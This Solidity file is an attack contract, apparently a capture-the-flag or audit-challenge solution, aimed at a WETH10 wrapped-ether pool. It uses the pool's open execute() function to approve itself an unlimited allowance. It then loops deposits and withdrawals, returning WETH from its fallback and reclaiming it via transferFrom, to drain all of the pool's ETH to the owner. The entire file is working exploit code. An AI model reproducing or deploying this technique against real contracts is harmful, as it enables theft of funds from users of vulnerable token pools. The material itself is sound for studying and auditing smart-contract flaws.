// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./WETH10.sol";

contract AttackContract {
    WETH10 public weth;
    uint256 public counter;
    address public owner;
    bool public isDone;

    constructor(WETH10 _weth) payable {
        weth = _weth;
        owner = msg.sender;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a < b) {
        return a;
        }
        return b;
    }

    function pwn() external {
        console.log("WETH balance of the weth pool at the very beginning: ", weth.balanceOf(address(weth)) / 10 ** 18);
        
        // Get max allowance
        console.log("Getting max allowance.");
        weth.execute(address(weth), 0, abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));

        // Drain the pool
        while (address(weth).balance > 0) {
            // Choose the smaller one from `address(this).balance` and `address(weth).balance`
            uint256 amount = address(this).balance < address(weth).balance ? address(this).balance : address(weth).balance;
            // ETH -> WETH in order to "warm up" the attack
            weth.deposit{value: amount}();

            isDone = false;
            // Trigger the "reentrancy" thing
            weth.withdrawAll();
            isDone = true;

            // Take out the WETH we gave to the weth pool during fallback
            // We can do this because we have max allowance
            weth.transferFrom(address(weth), address(this), amount);
            // WETH -> ETH legitimately without triggering the logic in fallback
            weth.withdrawAll();
        }

        console.log("WETH balance of the weth pool in the end: ", weth.balanceOf(address(weth)) / 10 ** 18);
        console.log("Looting all WETH!");
        weth.transferFrom(address(weth), address(this), weth.balanceOf(address(weth)));
        weth.withdraw(weth.balanceOf(address(this)));
        payable(owner).transfer(address(this).balance);
    }

    fallback() external payable {
        if (!isDone) {
            console.log("ETH received!: ", msg.value / 10**18);
            console.log("attackContract's ETH balance: ", address(this).balance / 10**18, "ETH");
            console.log("Sending 1 WETH back to weth pool.");
            weth.transfer(address(weth), msg.value);
        }
    }
}
